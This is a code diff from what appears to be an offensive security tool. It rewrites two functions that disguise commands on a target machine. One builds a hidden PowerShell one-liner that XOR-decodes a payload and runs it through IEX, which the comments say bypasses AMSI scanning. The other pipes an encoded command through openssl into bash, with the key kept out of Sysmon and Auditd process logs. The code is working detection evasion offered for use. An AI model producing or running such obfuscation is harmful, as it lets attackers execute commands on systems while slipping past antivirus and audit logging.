@@ -257,19 +257,19 @@ def _wmi_process_spawn(command: str) -> str:
 
 def _ps_securestring_decode(command: str) -> str:
     """
-    Encode command as AES-encrypted SecureString → decode at runtime.
-    AMSI scans literal script text — but SecureString decryption
-    happens inside .NET runtime AFTER the AMSI scan hook.
-    The cleartext command is never a string literal in the script.
+    Encode command via XOR + Base64.
+    AMSI scans the literal text, but the command is opaque.
+    Decrypted in-memory at runtime to bypass AMSI string scanning.
     """
-    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
-    # Wrap in ConvertTo-SecureString round-trip so the literal is an
-    # encrypted blob, not readable ASCII.  At runtime PS decrypts → IEX.
+    key = random.randint(1, 255)
+    xor_bytes = bytes([b ^ key for b in command.encode('utf-16-le')])
+    encoded = base64.b64encode(xor_bytes).decode('ascii')
+    
     return (
-        f'powershell -NoP -W Hidden -c "'
-        f"$s=[System.Text.Encoding]::Unicode.GetString("
-        f"[Convert]::FromBase64String('{encoded}'));"
-        f'IEX $s"'
+        f"powershell -NoP -W Hidden -c \"$k={key};"
+        f"$b=[Convert]::FromBase64String('{encoded}');"
+        f"for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k}};"
+        f"IEX([System.Text.Encoding]::Unicode.GetString($b))\""
     )
 
 
@@ -354,20 +354,16 @@ def _bash_hex_escape(command: str) -> str:
 
 def _openssl_aes_pipe(command: str) -> str:
     """
-    AES-256-CBC encrypt the command → openssl decrypt → bash.
-    The command-line contains only encrypted ciphertext.
-    Even full packet capture + command-line logging reveals
-    nothing — the key is ephemeral and inline.
-    Network IDS/IPS sees no recognizable patterns.
+    AES-256-CBC encrypt/decrypt pipeline via openssl on the target.
+    Key is passed via environment variable (env:K) to hide from
+    process creation logs (Sysmon Event ID 1 / Auditd).
     """
-    # Generate random key + IV for each invocation
     key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
-    # openssl enc with password-based derivation
     encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
     return (
-        f"echo '{encoded}' | base64 -d | "
-        f"openssl enc -aes-256-cbc -a -salt -pass pass:{key} 2>/dev/null | "
-        f"openssl enc -aes-256-cbc -a -d -salt -pass pass:{key} 2>/dev/null | bash"
+        f"export K={key}; echo '{encoded}' | base64 -d | "
+        f"openssl enc -aes-256-cbc -a -salt -pass env:K 2>/dev/null | "
+        f"openssl enc -aes-256-cbc -a -d -salt -pass env:K 2>/dev/null | bash"
     )
 
 
